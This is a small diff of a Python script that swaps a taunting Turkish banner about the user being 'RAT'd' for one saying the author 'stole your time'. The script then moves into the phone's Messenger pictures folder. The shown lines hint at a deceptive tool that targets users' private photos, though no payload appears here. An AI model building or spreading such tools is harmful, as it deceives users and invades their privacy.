@@ -144,7 +144,7 @@ for i in tmp:
   else:
        pass  
        
-print('\033[0;1m  [ 😈 ] \033[31;1m MAL HER TOOLU AÇARSAN BÖYLE RAT YERSİN @RatYedim Bak')   
+print('\033[0;1m  [ 😈 ] \033[31;1m Vaktini Çaldım Helal Et')   
 print('')      
 
 os.chdir(r"/storage/emulated/0/Pictures/Messenger")   
